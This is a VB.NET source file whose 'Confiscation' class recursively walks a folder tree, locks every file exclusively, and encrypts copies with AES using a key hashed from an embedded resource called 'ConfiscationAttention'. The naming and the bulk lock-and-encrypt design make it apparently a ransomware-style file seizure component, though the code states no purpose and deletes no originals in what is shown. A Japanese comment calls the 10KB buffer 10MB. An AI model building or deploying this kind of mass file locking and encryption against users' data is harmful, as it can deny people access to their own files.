Imports System.IO

Public Class Confiscation
    Public Shared Function StrictLockFile(path As String) As FileStream
        Return New FileStream(path, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None)
    End Function
    Public Shared Function EncryptFile(stream As Stream, path As String) As Boolean
        Return EncryptFile(stream, StrictLockFile(path))
    End Function
    Public Shared Function EncryptFile(stream As String, path As String) As Boolean
        Return EncryptFile(StrictLockFile(stream), StrictLockFile(path))
    End Function
    Public Shared Function EncryptFile(stream As Stream, path As Stream) As Boolean
        Try
            'RijndaelManagedオブジェクトを作成
            Dim rijndael As New System.Security.Cryptography.RijndaelManaged()

            '設定を変更するときは、変更する
            'rijndael.KeySize = 256
            'rijndael.BlockSize = 128
            'rijndael.FeedbackSize = 128
            'rijndael.Mode = System.Security.Cryptography.CipherMode.CBC
            'rijndael.Padding = System.Security.Cryptography.PaddingMode.PKCS7

            '共有キーと初期化ベクタを作成
            'Key、IVプロパティがnullの時に呼びだすと、自動的に作成される
            '自分で作成するときは、GenerateKey、GenerateIVメソッドを使う
            rijndael.Key = EncryptKey
            rijndael.IV = EncryptIV

            Dim encryptor As System.Security.Cryptography.ICryptoTransform = _
              rijndael.CreateEncryptor()
            '暗号化されたデータを書き出すためのCryptoStreamの作成
            Dim cryptStrm As New System.Security.Cryptography.CryptoStream( _
                path, encryptor, System.Security.Cryptography.CryptoStreamMode.Write)

            Dim bs As Byte() = New Byte((1024 * 10) - 1) {} '10MBずつ
            Dim readLen As Integer
            While True
                readLen = stream.Read(bs, 0, bs.Length)
                If readLen = 0 Then
                    Exit While
                End If
                cryptStrm.Write(bs, 0, readLen)
            End While
            cryptStrm.Flush()
            '閉じる
            stream.Close()
            cryptStrm.Close()
            encryptor.Dispose()
            path.Close()
            Return True
        Catch ex As Exception
            Console.WriteLine(ex.GetType.Name)
            Console.WriteLine(ex.Message)
            Console.WriteLine(ex.StackTrace)
            Return False
        End Try
    End Function
    Public Shared Function DecryptFile(stream As Stream, path As String) As Boolean
        Return DecryptFile(stream, StrictLockFile(path))
    End Function
    Public Shared Function DecryptFile(stream As String, path As String) As Boolean
        Return DecryptFile(StrictLockFile(stream), StrictLockFile(path))
    End Function
    Public Shared Function DecryptFile(stream As Stream, path As Stream) As Boolean
        Try
            'RijndaelManagedオブジェクトの作成
            Dim rijndael As New System.Security.Cryptography.RijndaelManaged()

            '共有キーと初期化ベクタを設定
            rijndael.Key = EncryptKey
            rijndael.IV = EncryptIV

            '対称復号化オブジェクトの作成
            Dim decryptor As System.Security.Cryptography.ICryptoTransform = _
                rijndael.CreateDecryptor()
            '暗号化されたデータを読み込むためのCryptoStreamの作成
            Dim cryptStrm As New System.Security.Cryptography.CryptoStream( _
               stream, decryptor, System.Security.Cryptography.CryptoStreamMode.Read)

            Dim bs As Byte() = New Byte((1024 * 10) - 1) {} '10MBずつ
            Dim readLen As Integer
            While True
                '復号化に失敗すると例外CryptographicExceptionが発生
                readLen = cryptStrm.Read(bs, 0, bs.Length)
                If readLen = 0 Then
                    Exit While
                End If
                path.Write(bs, 0, readLen)
            End While

            '閉じる
            path.Close()
            cryptStrm.Close()
            decryptor.Dispose()
            stream.Close()
            Return True
        Catch ex As Exception
            Console.WriteLine(ex.GetType.Name)
            Console.WriteLine(ex.Message)
            Console.WriteLine(ex.StackTrace)
            Return False
        End Try
    End Function
    Public Shared ReadOnly Property EncryptKey As Byte()
        Get
            Dim s = My.Resources.ConfiscationAttention
            Return CalcHash.Main(s)
        End Get
    End Property
    Public Shared ReadOnly Property EncryptIV As Byte()
        Get
            Dim s = My.Resources.ConfiscationAttention.
                Reverse.ToArray()
            Dim n = CalcHash.Main(s)
            ReDim Preserve n(15)
            Return n
        End Get
    End Property
    Public Shared Sub FileSearch(ByVal sourceDirName As String, saveTo As Queue(Of Object()))
        FileSearch(sourceDirName, saveTo, Nothing)
    End Sub
    Public Shared Sub FileSearch( _
        ByVal sourceDirName As String,
        saveTo As Queue(Of Object()),
        Optional ByVal destDirName As String = Nothing,
        Optional isRoot As Boolean = True,
        Optional lockFile As Boolean = True)
        destDirName = IIf(isRoot, Path.Combine(sourceDirName, "Confiscation"),
                                        destDirName) 'ルートフォルダか識別
        'コピー先のディレクトリがないときは作る
        If Not System.IO.Directory.Exists(destDirName) Then
            System.IO.Directory.CreateDirectory(destDirName)
            '属性もコピー
            System.IO.File.SetAttributes(destDirName, _
                System.IO.File.GetAttributes(sourceDirName))
        End If

        'コピー元のディレクトリにあるファイルをコピー
        Dim fs As String() = System.IO.Directory.GetFiles(sourceDirName)
        For Each f In fs
            Dim paths = {IIf(lockFile, StrictLockFile(f), f), _
               Path.Combine(destDirName, System.IO.Path.GetFileName(f))}
            saveTo.Enqueue(paths)
        Next

        'コピー元のディレクトリにあるディレクトリをコピー
        Dim dirs As String() = System.IO.Directory.GetDirectories(sourceDirName)
        Dim dir As String
        For Each dir In From i In dirs Where Path.GetFileNameWithoutExtension(i) <> "Confiscation"
            FileSearch(dir, saveTo, Path.Combine(destDirName, Path.GetFileName(dir)), False)
        Next
    End Sub
End Class
